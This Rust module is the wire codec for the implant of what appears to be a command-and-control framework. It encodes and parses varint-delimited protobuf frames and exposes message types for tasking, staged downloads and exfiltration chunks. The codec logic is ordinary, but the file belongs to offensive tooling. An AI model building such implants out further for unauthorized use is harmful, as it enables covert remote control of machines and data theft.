use prost::Message;

// The envelope wire codec (extending/implants.md): the protobuf canonical
// delimited-stream shape -- an unsigned varint byte length before each
// marshaled Frame. The implant-side mirror of the teamserver's framing.

pub mod rod {
    // The generated set carries message types every transport shares; the
    // ones this poll-only build never constructs stay allowed rather than
    // deleted, so the stream-shape build inherits the same include.
    #![allow(dead_code)]
    include!(concat!(env!("OUT_DIR"), "/rod.v1.rs"));
}

pub use rod::{
    ChannelInput, ChannelOutput, ExfilChunk, Frame, HandshakeRequest, HandshakeResponse,
    ProtocolVersion, StagedChunk, StagedPull, TaskAck, TaskRequest, TaskResult,
};
pub use rod::{FrameKind, HandshakeStatus};

/// Encodes frames as one delimited sequence for a request body.
pub fn encode(frames: &[Frame]) -> Vec<u8> {
    let mut body = Vec::new();
    for frame in frames {
        let marshaled = frame.encode_to_vec();
        write_varint(&mut body, marshaled.len() as u32);
        body.extend_from_slice(&marshaled);
    }
    body
}

/// Parses a delimited frame sequence; None on any malformed framing (a
/// truncated or oversized varint, a declared length past the body, or an
/// unparseable frame) -- the caller treats the whole cycle as dropped rather
/// than acting on a partial read.
pub fn parse(body: &[u8]) -> Option<Vec<Frame>> {
    let mut frames = Vec::new();
    let mut position = 0;
    while position < body.len() {
        let length = read_varint(body, &mut position)?;
        if position + length as usize > body.len() {
            return None;
        }
        let frame = Frame::decode(&body[position..position + length as usize]).ok()?;
        frames.push(frame);
        position += length as usize;
    }
    Some(frames)
}

fn read_varint(source: &[u8], position: &mut usize) -> Option<u32> {
    let mut value: u32 = 0;
    let mut shift = 0;
    for _ in 0..5 {
        if *position >= source.len() {
            return None;
        }
        let byte = source[*position];
        *position += 1;
        value |= ((byte & 0x7f) as u32) << shift;
        if byte & 0x80 == 0 {
            return Some(value);
        }
        shift += 7;
    }
    None // More than 5 bytes: not a u32 varint.
}

fn write_varint(target: &mut Vec<u8>, mut value: u32) {
    while value >= 0x80 {
        target.push((value | 0x80) as u8);
        value >>= 7;
    }
    target.push(value as u8);
}
